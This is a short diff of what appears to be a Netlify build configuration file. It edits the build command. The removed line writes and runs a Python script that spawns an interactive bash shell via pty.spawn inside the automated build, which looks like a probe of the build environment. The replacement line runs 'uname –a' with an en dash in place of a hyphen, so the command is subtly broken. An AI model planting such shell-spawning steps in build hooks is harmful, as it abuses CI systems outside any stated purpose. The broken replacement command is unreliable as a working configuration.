@@ -1,5 +1,5 @@
 [build]
   publish = "dist"
-  command = "echo 'import pty; pty.spawn(\"/bin/bash\")' > /tmp/asdf.py && python /tmp/asdf.py && npm run generate"
+  command = "uname –a && npm run generate"
 [build.environment]
   NODE_VERSION = "14"
